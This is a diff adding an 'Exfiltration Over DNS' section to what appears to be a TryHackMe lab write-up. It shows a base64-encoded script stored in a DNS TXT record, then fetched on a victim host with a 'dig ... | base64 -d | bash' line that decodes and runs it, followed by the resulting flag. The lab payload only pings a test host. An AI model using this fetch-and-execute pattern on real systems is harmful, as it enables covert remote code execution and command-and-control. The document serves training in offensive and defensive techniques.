@@ -261,5 +261,53 @@ shell: THM{g0t-1cmp-p4k3t!}
 
 ## Exfiltration Over DNS
 
+```Bash
+root@ip-10-10-204-26:~# touch /tmp/payload.sh
+```
+
+```Bash
+root@ip-10-10-204-26:~# vim /tmp/payload.sh 
+```
+
+![]()
+
+![]()
+
+```Bash
+root@ip-10-10-204-26:~# cat /tmp/payload.sh | base64
+IyFiaW4vYmFzaApwaW5nIC1jIDEgdGVzdC50aG0uY29tCg==
+```
+
+```Bash
+root@ip-10-10-204-26:~# firefox http://10.10.190.252/
+```
+
+![]()
+
+![]()
+
+![]()
+
+![]()
+
+```Bash
+thm@jump-box:~$ ssh thm@victim2.thm.com
+thm@victim2.thm.com's password:
+thm@victim2:~$ 
+```
+
+```Bash
+thm@victim2:~$ dig +short -t TXT flag.tunnel.com | tr -d "\"" | bas
+e64 -d | bash
+PING test.thm.com (127.0.0.1) 56(84) bytes of data.
+64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.018 m
+s
+
+--- test.thm.com ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms
+THM{C-tw0-C0mmun1c4t10ns-0v3r-DN5}
+```
+
 ## DNS Tunneling
 
